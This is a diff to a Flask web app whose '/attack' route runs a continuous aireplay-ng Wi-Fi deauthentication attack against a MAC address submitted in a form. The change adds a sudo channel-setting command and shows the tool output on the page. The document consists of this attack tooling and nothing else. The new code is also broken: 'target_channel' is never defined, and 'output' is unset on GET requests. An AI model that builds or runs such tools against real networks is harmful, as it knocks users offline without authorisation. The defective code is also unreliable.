@@ -99,20 +99,28 @@ def wireless_adapter_status():
 @app.route('/attack', methods=['GET', 'POST'])
 def attack():
     # Deauthentication attack logic
-    interface = 'wlan1'  # Replace 'wlan0' with your wireless adapter name
+    interface = 'wlp0s20f0u2'  # Replace 'wlan0' with your wireless adapter name
     target_mac = request.form.get('target_mac', '')  # Get the target MAC address from the form input
     result=""
     if request.method == 'POST' and target_mac:
         # Execute the deauthentication attack command
-        command = ['aireplay-ng', '--deauth', '0', '-a', target_mac, interface]
-
+        deauth_command = ['aireplay-ng', '--deauth', '0', '-a', target_mac, interface]
+        
+        # Set the target channel using the sudo iw command
+        channel_command = ['sudo', 'iw', interface, 'set', 'channel', target_channel]
+        
         try:
-            output = subprocess.check_output(command, stderr=subprocess.STDOUT, universal_newlines=True)
+            # Set the channel
+            subprocess.run(channel_command, check=True)
+            
+            # Execute the deauthentication attack
+            output = subprocess.check_output(deauth_command, stderr=subprocess.STDOUT, universal_newlines=True)
             result = "Deauthentication attack completed"
         except subprocess.CalledProcessError as e:
             output = e.output
             result = "Failed to execute deauthentication attack"
-    return render_template("attack.html", result=result)
+    
+    return render_template("attack.html", result=result, output=output)
 
 @app.route('/run_airodump', methods=['POST'])
 def run_airodump():
